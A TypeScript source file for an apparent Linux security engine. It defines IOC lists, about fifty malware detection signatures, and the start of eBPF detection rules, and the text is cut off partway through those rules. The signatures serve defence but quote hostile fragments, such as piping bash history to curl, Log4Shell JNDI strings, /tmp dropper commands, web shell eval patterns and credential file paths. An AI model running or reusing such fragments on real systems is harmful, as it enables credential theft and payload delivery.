import type {
  ProcEvent,
  ThreatIncident,
  DebugEntry,
  ScanSummary,
  UpdateInfo,
  ActionResult,
  AuditEntry,
  WhitelistEntry,
  FileScanResult,
  RiskLevel,
  TelemetryEvent,
  ScoreFactor,
  Severity,
  VirusSignature,
  MalwareScanResult,
  MalwareFamily,
  AvEngineStats,
  SandboxAnalysisReport,
  NetworkAttackEvent,
  NetworkDefenseConfig,
  StorageStats,
  PruneOptions,
  PruneResult,
  AutoPruneConfig,
  TempFileArtifact,
  UserAppWhitelistItem,
} from "../../types";

export interface NetworkConnection {
  id: string;
  pid: number;
  process_name: string;
  proto: "TCP" | "UDP";
  local_addr: string;
  local_port: number;
  remote_addr: string;
  remote_port: number;
  state: "ESTABLISHED" | "LISTEN" | "SYN_SENT" | "CLOSE_WAIT" | "TIME_WAIT";
  direction: "inbound" | "outbound" | "listen";
  bytes_tx: number;
  bytes_rx: number;
  threat: "safe" | "suspicious" | "c2_blocked" | "honeypot";
  threat_reason?: string;
  ts: number;
}

export interface DnsQuery {
  id: string;
  query: string;
  qtype: string;
  resolved_ip: string;
  pid: number;
  process_name: string;
  verdict: "safe" | "c2_flagged" | "suspicious";
  ts: number;
}

export interface CanaryToken {
  id: string;
  token: string;
  file_path: string;
  description: string;
  created_ts: number;
  triggered: boolean;
}

export const BUNDLED_IOCS = [
  { ioc: "198.199.73.244", kind: "ip", feed: "bundled", threat_type: "c2_server", confidence: 94, added_ts: 0 },
  { ioc: "45.33.32.156", kind: "ip", feed: "bundled", threat_type: "malware_host", confidence: 88, added_ts: 0 },
  { ioc: "23.239.9.123", kind: "ip", feed: "bundled", threat_type: "c2_server", confidence: 91, added_ts: 0 },
  { ioc: "evil.example.com", kind: "domain", feed: "bundled", threat_type: "phishing", confidence: 96, added_ts: 0 },
  { ioc: "malware.example.net", kind: "domain", feed: "bundled", threat_type: "malware_download", confidence: 93, added_ts: 0 },
  { ioc: "cobalt-strike.bad", kind: "domain", feed: "bundled", threat_type: "c2_beacon", confidence: 98, added_ts: 0 },
  { ioc: "44d88612fea8a8f36de82e1278abb02f", kind: "md5", feed: "bundled", threat_type: "ransomware", confidence: 99, added_ts: 0 },
  { ioc: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", kind: "sha256", feed: "bundled", threat_type: "trojan", confidence: 99, added_ts: 0 },
];

function computeDigest(input: string): string {
  let h1 = 0xdeadbeef;
  let h2 = 0x41c6ce57;
  for (let i = 0; i < input.length; i++) {
    const ch = input.charCodeAt(i);
    h1 = Math.imul(h1 ^ ch, 2654435761);
    h2 = Math.imul(h2 ^ ch, 1597334677);
  }
  h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
  h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
  return (4294967296 * (2097151 & h2) + (h1 >>> 0)).toString(16).padStart(12, "0");
}

export const VIRUS_SIGNATURES: VirusSignature[] = [
  {
    id: "sig-001",
    name: "Trojan.Linux.Mirai.Gen",
    family: "Botnet",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-MIRAI-01",
    description: "Linux IoT botnet scanner with busybox brute-forcing, SYN flood engine, and watchdog neutralization.",
    mitre_technique: "T1498 (Network Denial of Service) / T1584.005",
    indicators: ["busybox", "telnet", "watchdog", "mirai", "/bin/busybox rm -rf"],
  },
  {
    id: "sig-002",
    name: "Backdoor.Linux.WebShell.C99",
    family: "WebShell",
    severity: "critical",
    target_platform: "Web",
    detection_type: "yara",
    rule_code: "MAL-WEBSHELL-C99",
    description: "Multi-functional PHP web backdoor providing remote file management, SQL query execution, and terminal access.",
    mitre_technique: "T1505.003 (Web Shell)",
    indicators: ["c99sh", "eval(base64_decode(", "act=cmd", "sec. info:", "c99shell"],
  },
  {
    id: "sig-003",
    name: "Backdoor.PHP.ChinaChopper",
    family: "WebShell",
    severity: "critical",
    target_platform: "Web",
    detection_type: "pattern",
    rule_code: "MAL-WEBSHELL-CHOPPER",
    description: "Single-line high-stealth web backdoor invoking arbitrary evaluator payloads via raw POST parameters.",
    mitre_technique: "T1505.003 (Web Shell)",
    indicators: ["@eval($_post[", "assert($_post[", "@eval($_request[", "eval(base64_decode($_post"],
  },
  {
    id: "sig-004",
    name: "CoinMiner.Linux.XMRig",
    family: "CoinMiner",
    severity: "high",
    target_platform: "Linux",
    detection_type: "pattern",
    rule_code: "MAL-MINER-XMRIG",
    description: "Unauthorized Monero cryptocurrency mining payload connected to stratum+tcp pools, hijacking CPU cores.",
    mitre_technique: "T1496 (Resource Hijacking)",
    indicators: ["stratum+tcp://", "pool.minexmr.com", "donate-level", "xmrig", "hashrate", "randomx/0"],
  },
  {
    id: "sig-005",
    name: "Ransomware.Linux.DeadBolt",
    family: "Ransomware",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-RANSOM-DEADBOLT",
    description: "Rapid cryptographic encryption routine appending .deadbolt extensions and dropping BTC ransom notes.",
    mitre_technique: "T1486 (Data Encrypted for Impact)",
    indicators: [".deadbolt", "your files have been encrypted", "decrypt_key", "0.05 btc", "deadbolt.lock"],
  },
  {
    id: "sig-006",
    name: "Rootkit.Linux.Diamorphine",
    family: "Rootkit",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-ROOTKIT-DIAMORPH",
    description: "Loadable Kernel Module (LKM) rootkit hiding tasks with signal 31/64, invisible directory entries and privilege escalation.",
    mitre_technique: "T1014 (Rootkit) / T1547.006",
    indicators: ["diamorphine", "kill -64", "module_hide", "sys_call_table", "hacked_kill"],
  },
  {
    id: "sig-007",
    name: "Trojan.Linux.GenericDropper",
    family: "Dropper",
    severity: "high",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-DROPPER-01",
    description: "Staged payload delivery script downloading binaries to /tmp or /dev/shm, setting execution permissions and unlinking.",
    mitre_technique: "T1105 (Ingress Tool Transfer) / T1036.005",
    indicators: ["curl -o /tmp/", "chmod +x /tmp/", "rm -f /tmp/", "wget -q -o /dev/shm"],
  },
  {
    id: "sig-008",
    name: "Spyware.Linux.Keylogger",
    family: "Spyware",
    severity: "high",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-SPY-KEYLOG",
    description: "Background process sniffing /dev/input/event character streams to harvest user keystrokes and credentials.",
    mitre_technique: "T1056.001 (Keylogging)",
    indicators: ["/dev/input/event", "input_event", "key_enter", "keys.log", "evtest --grab"],
  },
  {
    id: "sig-009",
    name: "EICAR.Standard.Antivirus.TestFile",
    family: "TestPattern",
    severity: "low",
    target_platform: "CrossPlatform",
    detection_type: "pattern",
    rule_code: "EICAR-AV-TEST",
    description: "Standard industry test file developed by European Institute for Computer Antivirus Research to safely test AV engines.",
    mitre_technique: "T1204 (User Execution Test)",
    indicators: ["x5o!p%@ap[4\\pzx54(p^)7cc)7}$eicar-standard-antivirus-test-file!$h+h*"],
  },
  {
    id: "sig-010",
    name: "Trojan.Linux.Mozi.P2P",
    family: "Botnet",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-MOZI-01",
    description: "P2P Linux IoT botnet utilizing BitTorrent DHT network for encrypted command routing and DDoS synchronization.",
    mitre_technique: "T1584.005 (Botnet) / T1071 (Application Layer Protocol)",
    indicators: ["mozi.m", "mozi.a", "[mozi]", "dht.db", "find_node"],
  },
  {
    id: "sig-011",
    name: "Trojan.Linux.Gafgyt.BASHLITE",
    family: "Botnet",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "pattern",
    rule_code: "MAL-GAFGYT-01",
    description: "BASHLITE/Qbot derivative targeting embedded architectures for TCP/UDP flooding and shell spawning.",
    mitre_technique: "T1498 (Network Denial of Service)",
    indicators: ["bashlite", "gafgyt", "lizkebab", "gayfgt", "/bin/busybox bashlite"],
  },
  {
    id: "sig-012",
    name: "Trojan.Linux.Kinsing.Cryptojacker",
    family: "CoinMiner",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-KINSING-01",
    description: "Container break-out and cryptominer targeting misconfigured Docker APIs and Redis servers, killing competing miners.",
    mitre_technique: "T1610 (Deploy Container) / T1496 (Resource Hijacking)",
    indicators: ["kinsing", "kdevtmpfsi", "alsp.sh", "spr.sh", "disable_firewall.sh"],
  },
  {
    id: "sig-013",
    name: "Trojan.Linux.BPFDoor.Stealth",
    family: "Backdoor",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-BPFDOOR-01",
    description: "Ultra-stealthy passive Linux backdoor using raw sockets and BPF packet filters to listen through local firewalls.",
    mitre_technique: "T1205.002 (Socket Filters / BPF) / T1043",
    indicators: ["bpfdoor", "/dev/shm/kdmtmp", "bpf_attach", "packet_mmap", "so_attach_filter"],
  },
  {
    id: "sig-014",
    name: "Trojan.Linux.Drovorub.Kernel",
    family: "Rootkit",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "yara",
    rule_code: "MAL-DROVORUB-01",
    description: "Russian military intelligence (APT28) Linux malware suite with kernel module rootkit, agent, and server.",
    mitre_technique: "T1014 (Rootkit) / T1547.006",
    indicators: ["drovorub", "drovorub-kernel", "drov_client", "drov_server", "/proc/drovorub"],
  },
  {
    id: "sig-015",
    name: "Trojan.Linux.Doki.DockerEscape",
    family: "Trojan",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-DOKI-01",
    description: "Stealthy container breakout malware using Dogecoin blockchain transactions as dynamic C2 address resolution.",
    mitre_technique: "T1611 (Escape to Host) / T1102.001",
    indicators: ["doki", "dogechain.info", "crond_doki", "cgroup/devices/docker"],
  },
  {
    id: "sig-016",
    name: "Trojan.Linux.Skidmap.Rootkit",
    family: "Rootkit",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-SKIDMAP-01",
    description: "Linux kernel rootkit faking system load and CPU statistics to hide intense cryptomining operations.",
    mitre_technique: "T1014 (Rootkit) / T1036 (Masquerading)",
    indicators: ["skidmap", "kaudits", "fake_top", "rootkit.ko", "pinfo"],
  },
  {
    id: "sig-017",
    name: "Trojan.Linux.RotaJakiro.Backdoor",
    family: "Backdoor",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "yara",
    rule_code: "MAL-ROTAJAKIRO-01",
    description: "Highly sophisticated modular ELF backdoor with 12 distinct encrypted commands, memory-only execution and systemd persistence.",
    mitre_technique: "T1059 (Command Execution) / T1574",
    indicators: ["rotajakiro", "systemd-helper", "gvfsd-helper", "jakiro_payload"],
  },
  {
    id: "sig-018",
    name: "Trojan.Linux.RedXOR.APT",
    family: "Trojan",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "pattern",
    rule_code: "MAL-REDXOR-01",
    description: "Polymorphic Linux Trojan attributed to nation-state APT actors; encodes C2 data using XOR keys with multi-threading.",
    mitre_technique: "T1027 (Obfuscated Files) / T1071.001",
    indicators: ["redxor", "xor_key_0x", "po_daemon", "/tmp/.dump_file"],
  },
  {
    id: "sig-019",
    name: "Trojan.Linux.Symbiote.SharedLib",
    family: "Rootkit",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-SYMBIOTE-01",
    description: "Nearly undetectable shared object rootkit injected via LD_PRELOAD hooking libc functions and packet capture libraries.",
    mitre_technique: "T1574.006 (Dynamic Linker Hijacking) / T1014",
    indicators: ["symbiote", "ld.so.preload", "pcap_loop_hook", "fopen_hook", "hide_conn"],
  },
  {
    id: "sig-020",
    name: "Trojan.Linux.Tsunami.Kaiten",
    family: "Trojan",
    severity: "high",
    target_platform: "Linux",
    detection_type: "pattern",
    rule_code: "MAL-TSUNAMI-01",
    description: "Classic IRC-based DDoS client and remote shell backdoor frequently compiled on compromised UNIX servers.",
    mitre_technique: "T1071.001 (IRC C2) / T1498",
    indicators: ["kaiten", "tsunami", "notice %s :tsunami", "privmsg %s :pan flood"],
  },
  {
    id: "sig-021",
    name: "Worm.Linux.Sysrv.Cryptoworm",
    family: "Worm",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-SYSRV-01",
    description: "Go-based multi-platform self-propagating worm exploiting enterprise web apps (Tomcat, Spring, Redis) to install XMR miners.",
    mitre_technique: "T1210 (Exploitation of Remote Services) / T1496",
    indicators: ["sysrv-hello", "ldr.sh", "sys.x86_64", "xmr.pool", "/tmp/sysrv"],
  },
  {
    id: "sig-022",
    name: "Trojan.CrossPlatform.CobaltStrike.Beacon",
    family: "Trojan",
    severity: "critical",
    target_platform: "CrossPlatform",
    detection_type: "yara",
    rule_code: "MAL-COBALT-BEACON",
    description: "Post-exploitation memory-injected Command & Control beacon executing staging shellcode and remote job dispatching.",
    mitre_technique: "T1071.001 (Web Protocols) / T1059",
    indicators: ["cobalt-strike", "beacon.bin", "stage2.bin", "%s as %s\\%s: %d", "malleable c2"],
  },
  {
    id: "sig-023",
    name: "Backdoor.Linux.PupyRAT.Payload",
    family: "Backdoor",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-PUPYRAT-01",
    description: "Open-source multi-platform Python remote administration tool (RAT) with in-memory reflective loading and encrypted C2.",
    mitre_technique: "T1059.006 (Python) / T1620 (Reflective Loading)",
    indicators: ["pupy", "pupysh", "pupyload", "rpyc.core", "pupylib"],
  },
  {
    id: "sig-024",
    name: "Ransomware.Linux.LockBit.ESXi",
    family: "Ransomware",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-LOCKBIT-ESXI",
    description: "High-speed multi-threaded ESXi hypervisor locker stopping vmx processes and encrypting VMFS volumes.",
    mitre_technique: "T1486 (Data Encrypted for Impact) / T1489 (Service Stop)",
    indicators: ["lockbit", ".lockbit", "esxcli vm process kill", "restore-my-files.txt", "vmdk-encryption"],
  },
  {
    id: "sig-025",
    name: "Ransomware.Linux.BlackCat.ALPHV",
    family: "Ransomware",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "yara",
    rule_code: "MAL-ALPHV-BLACKCAT",
    description: "Rust-engineered cross-platform ransomware utilizing ChaCha20/AES with privilege checks and VM unregistering commands.",
    mitre_technique: "T1486 (Data Encrypted for Impact) / T1489",
    indicators: ["alphv", "blackcat", "esxcli", "vim-cmd vmsvc/getallvms", "access-token"],
  },
  {
    id: "sig-026",
    name: "Ransomware.Linux.Babuk.Locker",
    family: "Ransomware",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-BABUK-LOCKER",
    description: "Enterprise ransomware using ECDH curve25519 and ChaCha20 encryption targeted at hypervisors and storage pools.",
    mitre_technique: "T1486 (Data Encrypted for Impact)",
    indicators: ["babuk", ".babyk", "how_to_restore_your_files.txt", "chachapoly", "/vmfs/volumes"],
  },
  {
    id: "sig-027",
    name: "Ransomware.Linux.Hive.Linux",
    family: "Ransomware",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-HIVE-LINUX",
    description: "Aggressive Go/Rust ransomware terminating database services and hypervisors before encrypting root filesystems.",
    mitre_technique: "T1486 (Data Encrypted for Impact) / T1489",
    indicators: ["hive", ".key.hive", "how_to_decrypt.hive", "hive_encryptor"],
  },
  {
    id: "sig-028",
    name: "Ransomware.Linux.RansomEXX.ELF",
    family: "Ransomware",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-RANSOMEXX-01",
    description: "Targeted ELF ransomware variant killing VM processes, erasing shadow logs, and locking virtual hard drives.",
    mitre_technique: "T1486 (Data Encrypted for Impact)",
    indicators: ["ransomexx", "read_me_exx.txt", ".tnet", "vmx kill", "/vmfs/volumes/"],
  },
  {
    id: "sig-029",
    name: "Ransomware.Linux.DarkSide.Linux",
    family: "Ransomware",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "pattern",
    rule_code: "MAL-DARKSIDE-01",
    description: "Custom Salsa20/RSA encrypted ransomware targeting ESXi servers, unmounting backup storage partitions.",
    mitre_technique: "T1486 (Data Encrypted for Impact)",
    indicators: ["darkside", "readme.readme.txt", "salsa20_esx", ".darkside"],
  },
  {
    id: "sig-030",
    name: "Ransomware.Linux.Defray777.Ransom",
    family: "Ransomware",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-DEFRAY-01",
    description: "High-profile double-extortion ransomware disabling local firewall rules and encrypting databases.",
    mitre_technique: "T1486 (Data Encrypted for Impact) / T1562.001",
    indicators: ["defray", "target.lock", "readme_defray.txt", "kill_vms"],
  },
  {
    id: "sig-031",
    name: "Backdoor.PHP.WSO.FilesMan",
    family: "WebShell",
    severity: "critical",
    target_platform: "Web",
    detection_type: "yara",
    rule_code: "MAL-WEBSHELL-WSO",
    description: "WSO (Web Shell by Orb) 'FilesMan' backdoor offering database inspection, PHP evaluator, and root brute-force tools.",
    mitre_technique: "T1505.003 (Web Shell)",
    indicators: ["filesman", "wso_version", "action=eval", "sec_pass", "default_action"],
  },
  {
    id: "sig-032",
    name: "Backdoor.PHP.b374k.Shell",
    family: "WebShell",
    severity: "critical",
    target_platform: "Web",
    detection_type: "pattern",
    rule_code: "MAL-WEBSHELL-B374K",
    description: "Advanced AJAX-driven PHP web terminal offering reverse port-binding, ZIP packer, and server exploit wrappers.",
    mitre_technique: "T1505.003 (Web Shell)",
    indicators: ["b374k", "base64_decode(gzinflate(", "b374k_pass", "ajax_terminal"],
  },
  {
    id: "sig-033",
    name: "Backdoor.PHP.Weevely.Stealth",
    family: "WebShell",
    severity: "critical",
    target_platform: "Web",
    detection_type: "heuristic",
    rule_code: "MAL-WEBSHELL-WEEVELY",
    description: "Stealth PHP backdoor weaponized for post-exploitation, tunneling terminal commands encrypted inside HTTP cookie headers.",
    mitre_technique: "T1505.003 (Web Shell) / T1071.001",
    indicators: ["weevely", "$_cookie[", "str_replace(\"\\n\",", "gzuncompress"],
  },
  {
    id: "sig-034",
    name: "Backdoor.JSP.Godzilla.Shell",
    family: "WebShell",
    severity: "critical",
    target_platform: "Web",
    detection_type: "pattern",
    rule_code: "MAL-WEBSHELL-GODZILLA",
    description: "Dynamic AES-encrypted JSP/Java web shell popular in APT campaigns, executing bytecodes directly in class loaders.",
    mitre_technique: "T1505.003 (Web Shell) / T1059",
    indicators: ["godzilla", "defineclass", "cipher.getinstance(\"aes\")", "base64.getdecoder()"],
  },
  {
    id: "sig-035",
    name: "Backdoor.JSP.Behinder.Memshell",
    family: "WebShell",
    severity: "critical",
    target_platform: "Web",
    detection_type: "heuristic",
    rule_code: "MAL-WEBSHELL-BEHINDER",
    description: "Java memory-only web shell injected into Tomcat/Spring application servers without persisting a file on disk.",
    mitre_technique: "T1505.003 (Web Shell) / T1027",
    indicators: ["behinder", "rebeyond", "javax.crypto.spec.secretkeyspec", "classloader.defineclass"],
  },
  {
    id: "sig-036",
    name: "Backdoor.Python.SharPyShell",
    family: "WebShell",
    severity: "high",
    target_platform: "Web",
    detection_type: "heuristic",
    rule_code: "MAL-WEBSHELL-SHARPY",
    description: "Encrypted Python webshell for WSGI/Django/Flask environments executing reflective code payloads.",
    mitre_technique: "T1505.003 (Web Shell)",
    indicators: ["sharpyshell", "exec(compile(", "b64decode", "wsgiref.simple_server"],
  },
  {
    id: "sig-037",
    name: "CoinMiner.Linux.LemonDuck.Worm",
    family: "Worm",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-LEMONDUCK-01",
    description: "Multi-platform crypto-worm scanning SMB, SSH, Redis, and Hadoop ports to propagate and hijack CPU cycles.",
    mitre_technique: "T1210 (Exploitation of Remote Services) / T1496",
    indicators: ["lemonduck", "duck.sh", "core.sh", "ifconfig.me/ip", "/tmp/lemon"],
  },
  {
    id: "sig-038",
    name: "CoinMiner.Linux.8220Gang.Script",
    family: "CoinMiner",
    severity: "high",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-8220GANG-01",
    description: "Automated cryptomining campaign exploiting Atlassian Confluence and Log4j flaws, downloading custom IRC miners.",
    mitre_technique: "T1190 (Exploit Public Application) / T1496",
    indicators: ["8220gang", "pure_miner", "test.sh", "185.181.10.", "/tmp/linux_miner"],
  },
  {
    id: "sig-039",
    name: "CoinMiner.Linux.Watchbog.Bot",
    family: "CoinMiner",
    severity: "high",
    target_platform: "Linux",
    detection_type: "pattern",
    rule_code: "MAL-WATCHBOG-01",
    description: "Linux mining bot scanning for vulnerable Jira, Solr, and ThinkPHP instances to drop persistence scripts.",
    mitre_technique: "T1190 (Exploit Public Application) / T1053.003",
    indicators: ["watchbog", "pastebin.com/raw", "crond_cleaner", "gpg --dearmor"],
  },
  {
    id: "sig-040",
    name: "CoinMiner.Linux.TeamTNT.Hildegard",
    family: "CoinMiner",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-TEAMTNT-HILDEGARD",
    description: "Kubernetes/Docker targeted botnet utilizing tmate tunneling, masscan reconnaissance, and memory-loaded miners.",
    mitre_technique: "T1610 (Deploy Container) / T1572 (Protocol Tunneling)",
    indicators: ["teamtnt", "hildegard", "tmate -s", "masscan -p", "kube-miner"],
  },
  {
    id: "sig-041",
    name: "CoinMiner.Linux.Kdevtmpfsi",
    family: "CoinMiner",
    severity: "high",
    target_platform: "Linux",
    detection_type: "pattern",
    rule_code: "MAL-KDEVTMPFSI-01",
    description: "Mining process dropped via unauthenticated Redis servers and PHP-FPM servers, masquerading as temporary kernel thread.",
    mitre_technique: "T1036.005 (Hidden Process) / T1496",
    indicators: ["kdevtmpfsi", "kinsing", "/tmp/kdevtmpfsi", "/var/tmp/kinsing"],
  },
  {
    id: "sig-042",
    name: "Rootkit.Linux.Reptile.LKM",
    family: "Rootkit",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-ROOTKIT-REPTILE",
    description: "Kernel rootkit featuring ICMP/UDP port-knocking backdoor listener, file hiding, and task table unlinking.",
    mitre_technique: "T1014 (Rootkit) / T1205 (Traffic Signaling)",
    indicators: ["reptile", "rep_cmd", "reptile_rc", "reptile_hide", "/reptile/"],
  },
  {
    id: "sig-043",
    name: "Rootkit.Linux.Azazel.Preload",
    family: "Rootkit",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-ROOTKIT-AZAZEL",
    description: "Userland rootkit hooking dlsym, ptrace, and readdir via LD_PRELOAD to hide network sockets and processes.",
    mitre_technique: "T1574.006 (Dynamic Linker Hijacking) / T1014",
    indicators: ["azazel", "libazazel.so", "unhide_proc", "anti_debug_ptrace"],
  },
  {
    id: "sig-044",
    name: "Rootkit.Linux.Suterusu.LKM",
    family: "Rootkit",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "yara",
    rule_code: "MAL-ROOTKIT-SUTERUSU",
    description: "Modern Linux rootkit supporting kernel 3.x-5.x inline hooking, socket hiding, and credential sniffer interception.",
    mitre_technique: "T1014 (Rootkit) / T1547.006",
    indicators: ["suterusu", "suterusu_write", "hide_pid", "hide_tcp4_port"],
  },
  {
    id: "sig-045",
    name: "Rootkit.Linux.Jynx2.Userland",
    family: "Rootkit",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-ROOTKIT-JYNX2",
    description: "LD_PRELOAD userland rootkit with Magic Packet ICMP reverse shell trigger and configuration concealed in /etc.",
    mitre_technique: "T1574.006 (Dynamic Linker Hijacking) / T1014",
    indicators: ["jynx", "jynx2", "magic_packet", "shady_port", "hide_file"],
  },
  {
    id: "sig-046",
    name: "Rootkit.Linux.Ebury.OpenSSH",
    family: "Rootkit",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "pattern",
    rule_code: "MAL-ROOTKIT-EBURY",
    description: "Trojanized OpenSSH shared library (libkeyutils) stealing inbound/outbound credentials and private keys.",
    mitre_technique: "T1556.004 (Network Device Authentication) / T1014",
    indicators: ["ebury", "libkeyutils.so.1.backdoor", "windigo", "keyutils_hook"],
  },
  {
    id: "sig-047",
    name: "InfoStealer.Linux.TeamTNT.CredHarvester",
    family: "InfoStealer",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-STEALER-TEAMTNT",
    description: "Credential harvester scraping AWS tokens, Docker configuration, Kubernetes secrets, and bash history files.",
    mitre_technique: "T1552.001 (Credentials in Files) / T1083",
    indicators: [".aws/credentials", ".docker/config.json", "/run/secrets/kubernetes.io", "id_rsa", "cat ~/.bash_history | curl"],
  },
  {
    id: "sig-048",
    name: "InfoStealer.Linux.MimikatzELF.Mimipenguin",
    family: "InfoStealer",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-STEALER-MIMIPENGUIN",
    description: "Password dumper extracting cleartext login credentials from GNOME Keyring, vsftpd, and Apache memory dumps.",
    mitre_technique: "T1003.008 (/etc/shadow & Process Memory) / T1055",
    indicators: ["mimipenguin", "dump_gnome_keyring", "gcore -o", "strings /tmp/dump* | grep password"],
  },
  {
    id: "sig-049",
    name: "InfoStealer.Linux.LaZagne.ELF",
    family: "InfoStealer",
    severity: "high",
    target_platform: "Linux",
    detection_type: "pattern",
    rule_code: "MAL-STEALER-LAZAGNE",
    description: "Post-exploitation password recovery suite retrieving stored credentials from browsers, databases, and WiFi profiles.",
    mitre_technique: "T1555 (Credentials from Password Stores)",
    indicators: ["lazagne", "lazagne.py", "all_passwords", "browsers/firefox", "sysadmin/shadow"],
  },
  {
    id: "sig-050",
    name: "Spyware.Linux.LinPEAS.Exfiltrator",
    family: "Spyware",
    severity: "high",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "MAL-SPY-LINPEAS",
    description: "Automated privilege escalation reconnaissance script probing SUID binaries, cron jobs, and exfiltrating output.",
    mitre_technique: "T1082 (System Information Discovery) / T1048",
    indicators: ["linpeas.sh", "peass-ng", "cve-202", "curl -d @- http://", "sudo -l -n"],
  },
  {
    id: "sig-051",
    name: "ExploitKit.Linux.DirtyCOW.CVE20165195",
    family: "ExploitKit",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "heuristic",
    rule_code: "EXP-DIRTYCOW-01",
    description: "Linux kernel privilege escalation exploit weaponizing Copy-on-Write race condition to overwrite /etc/passwd.",
    mitre_technique: "T1068 (Exploitation for Privilege Escalation)",
    indicators: ["dirtycow", "cve-2016-5195", "madvise(madv_dontneed)", "/proc/self/mem", "chroot_cow"],
  },
  {
    id: "sig-052",
    name: "ExploitKit.Linux.PwnKit.CVE20214034",
    family: "ExploitKit",
    severity: "critical",
    target_platform: "Linux",
    detection_type: "pattern",
    rule_code: "EXP-PWNKIT-01",
    description: "Memory corruption local privilege escalation in Polkit pkexec component granting root access.",
    mitre_technique: "T1068 (Exploitation for Privilege Escalation)",
    indicators: ["pwnkit", "cve-2021-4034", "pkexec", "gconv-modules", "pwnkit.c"],
  },
  {
    id: "sig-053",
    name: "ExploitKit.Java.Log4Shell.JNDI",
    family: "ExploitKit",
    severity: "critical",
    target_platform: "CrossPlatform",
    detection_type: "pattern",
    rule_code: "EXP-LOG4SHELL-01",
    description: "Remote code execution targeting Log4j via JNDI injection (CVE-2021-44228) fetching untrusted remote classes.",
    mitre_technique: "T1190 (Exploit Public Application) / T1204",
    indicators: ["${jndi:ldap://", "${jndi:rmi://", "${jndi:dns://", "log4shell", "org.apache.logging.log4j"],
  },
];

export interface EvaluationResult {
  score: number;
  severity: Severity;
  verdict: "clean" | "suppressed" | "monitored" | "alert";
  mitre_tactic: string;
  mitre_technique: string;
  rule: string;
  flags: string[];
  factors: ScoreFactor[];
  suppressed: boolean;
  suppression_reason: string;
  explanation: string;
  virus_match?: {
    name: string;
    family: MalwareFamily;
    severity: Severity;
    rule: string;
  };
}

export class AegisSecurityEngine {
  private listeners: Map<string, Set<(payload: any) => void>> = new Map();
  private processes: Map<number, ProcEvent> = new Map();
  private incidents: ThreatIncident[] = [];
  private debugLog: DebugEntry[] = [];
  private auditLog: AuditEntry[] = [];
  private whitelist: WhitelistEntry[] = [];
  private canaries: CanaryToken[] = [];
  private connections: NetworkConnection[] = [];
  private dnsQueries: DnsQuery[] = [];
  private telemetry: TelemetryEvent[] = [];
  private malwareResults: MalwareScanResult[] = [];
  private blockedIps: Set<string> = new Set();
  private lastDigest = "0000000000000000";
  private ebpfStats = {
    state: "active",
    interface: "eth0",
    mode: "threat_ports_only",
    attached_at: Date.now() - 60000,
    instructions_count: 11,
    active_rules_count: 6,
    packets_inspected: 0,
    bytes_processed: 0,
    threats_detected: 0,
    packets_dropped: 0,
    driver_backend: "Linux SO_ATTACH_BPF / Classical BPF JIT",
  };
  private ebpfInspectedPackets: any[] = [];
  private ebpfRules: any[] = [
    {
      id: "EBPF-R001",
      name: "High-Entropy C2 Shellcode",
      description: "Detects encrypted C2 payloads or packed shellcode with Shannon entropy > 7.1",
      protocol: "TCP",
      dst_port: null,
      min_entropy: 7.1,
      payload_signature: null,
      action: "alert",
      severity: "high",
      enabled: true,
    },
    {
      id: "EBPF-R002",
      name: "Default C2 Reverse Shell Port",
      description: "Flags connections to known default backdoor/C2 listener ports (4444)",
      protocol: "TCP",
      dst_port: 4444,
      min_entropy: null,
      payload_signature: null,
      action: "drop",
      severity: "critical",
      enabled: true,
    },
    {
      id: "EBPF-R003",
      name: "DNS Covert Tunneling Anomaly",
      description: "High-entropy queries on UDP port 53 indicating covert exfiltration channel",
      protocol: "UDP",
      dst_port: 53,
      min_entropy: 5.8,
      payload_signature: null,
      action: "alert",
      severity: "high",
